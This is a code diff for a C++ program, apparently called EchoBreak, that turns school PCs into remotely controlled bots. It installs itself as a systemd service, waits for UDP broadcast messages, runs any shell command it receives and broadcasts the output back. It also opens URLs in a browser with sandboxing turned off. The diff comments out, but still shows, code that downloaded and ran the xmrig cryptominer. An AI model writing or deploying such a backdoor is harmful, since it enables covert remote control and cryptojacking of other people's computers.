@@ -11,7 +11,8 @@
 #include <array>
 #include <memory>
 
-#define PORT 6969
+#define REC_PORT 6969
+#define SENDING_PORT 6868
 #define BUFFER_SIZE 256
 
 std::vector<std::string> split(std::string str){
@@ -67,6 +68,35 @@ int main() {
 
         system("systemctl enable eb");
     }
+
+    int send_sock;
+    int opt = 1;
+    struct sockaddr_in send_broadcastAddr;
+
+    // sending
+    if ((send_sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
+        std::ofstream log("log", std::ios::out);
+        log << "Sending socket creation error";
+        log.close();
+        close(send_sock);
+        return -1;
+    }
+    //enable broadcast
+    if (setsockopt(send_sock, SOL_SOCKET, SO_BROADCAST, &opt, sizeof(opt)) < 0) {
+        std::ofstream log("log", std::ios::out);
+        log << "Sending error setting socket options";
+        log.close();
+        close(send_sock);
+        return -1;
+    }
+
+    memset(&send_broadcastAddr, 0, sizeof(send_broadcastAddr));
+    send_broadcastAddr.sin_family = AF_INET;
+    send_broadcastAddr.sin_port = htons(SENDING_PORT);
+    send_broadcastAddr.sin_addr.s_addr = inet_addr("172.17.213.255"); 
+
+    //receiving
+
     int sock;
     struct sockaddr_in broadcastAddr;
     char buffer[BUFFER_SIZE];
@@ -82,7 +112,7 @@ int main() {
     memset(&broadcastAddr, 0, sizeof(broadcastAddr));
     broadcastAddr.sin_family = AF_INET;
     broadcastAddr.sin_addr.s_addr = INADDR_ANY;
-    broadcastAddr.sin_port = htons(PORT);
+    broadcastAddr.sin_port = htons(REC_PORT);
 
     if (bind(sock, (struct sockaddr*)&broadcastAddr, sizeof(broadcastAddr)) < 0) {
         std::ofstream log("log", std::ios::out);
@@ -93,33 +123,41 @@ int main() {
     }
 
     std::vector<std::string> msg;
-    std::string comp_hostname = exec("hostname");
 
     while (true) {
         socklen_t addrLen = sizeof(broadcastAddr);
+        socklen_t sendLen = sizeof(send_broadcastAddr);
         ssize_t bytesReceived = recvfrom(sock, buffer, BUFFER_SIZE, 0, (struct sockaddr*)&broadcastAddr, &addrLen);
         msg = split((std::string)buffer);
 
         if (bytesReceived > 0) {
-            if(msg[0] == comp_hostname || msg[0] == "all" || (comp_hostname[0] == 'S' && comp_hostname[1] == 'M' && msg[0] == "114")){
+            if(msg[0] == exec("hostname") || msg[0] == "all"){
                 if(msg[1] == "cmd"){
                     std::string answ = exec(msg[2].c_str());
-                    sendto(sock, answ.c_str(), answ.size(), 0, (struct sockaddr*)&broadcastAddr, addrLen);
+                    sendto(send_sock, answ.c_str(), answ.size(), 0, (struct sockaddr*)&send_broadcastAddr, addrLen);
                 }
                 else if(msg[1] == "open url"){
                         //ours school pc using yandex
                         system((std::string("yandex-browser-stable --no-sandbox ") + msg[2]).c_str());
                 }
                 //==========================================================================
-                
+                //coming soon
+                /*
                 else if(msg[1] == "inst_xmrig") {
-                    system("git clone https://github.com/Andrew-24coop/EchoBreak-xmrig.git && cd EchoBreak-xmrig");
-                    system("chmod +x conf");
-		    system("./conf"); // change config.json file (rename "name_of_the_worker" to exec(hostname))
+                    // git clone https://github.com/Andrew-24coop/EchoBreak-xmrig.git
+                    // cd EchoBreak-xmrig/xmrig-6.22.2
+                    // change config.json file (rename "name_of_the_worker" to exec(hostname))
+                    xmrig_flag = true;
                 }
                 else if(msg[1] == "run_xmrig") {
-                    system("./EchoBreak-xmrig/xmrig-6.22.2/xmrig");
-                }
+                    if (xmrig_flag) {
+                        // run ./xmrig
+                    }
+                    else {
+                        // send back error
+                    }
+                }*/
+		               //==========================================================================
             }
             memset(buffer, 0, sizeof(buffer));
         }
